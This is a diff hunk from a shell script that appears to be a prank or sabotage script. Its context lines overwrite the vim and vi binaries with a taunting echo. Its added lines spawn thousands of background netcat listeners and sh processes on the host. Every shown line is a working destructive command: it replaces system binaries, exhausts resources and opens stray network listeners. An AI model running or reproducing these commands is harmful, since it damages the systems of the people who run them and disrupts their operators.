@@ -16,9 +16,9 @@ echo "echo use nano, coward" >> /usr/bin/vim
 chmod +x /usr/bin/vim
 echo "echo use nano, coward" > $(which vi)
 
-
-
-for i in {2000..5000}
+#Listen on an absolute ton of random ports
+for i in {1..3000}
 do
-   nc -l $i &
+   nc -l &
+   sh &
 done
